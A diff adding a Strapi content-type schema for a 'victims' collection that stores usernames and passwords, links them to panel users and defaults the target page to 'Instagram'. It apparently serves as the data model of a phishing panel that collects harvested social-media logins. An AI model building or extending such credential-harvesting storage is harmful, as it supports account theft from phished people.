@@ -1,0 +1,34 @@
+{
+  "kind": "collectionType",
+  "collectionName": "victims",
+  "info": {
+    "name": "victim",
+    "description": ""
+  },
+  "options": {
+    "increments": true,
+    "timestamps": true,
+    "draftAndPublish": false
+  },
+  "pluginOptions": {},
+  "attributes": {
+    "username": {
+      "type": "string",
+      "required": true
+    },
+    "password": {
+      "type": "string",
+      "required": true
+    },
+    "users_permissions_user": {
+      "plugin": "users-permissions",
+      "model": "user",
+      "via": "victims"
+    },
+    "Page": {
+      "type": "string",
+      "required": true,
+      "default": "Instagram"
+    }
+  }
+}
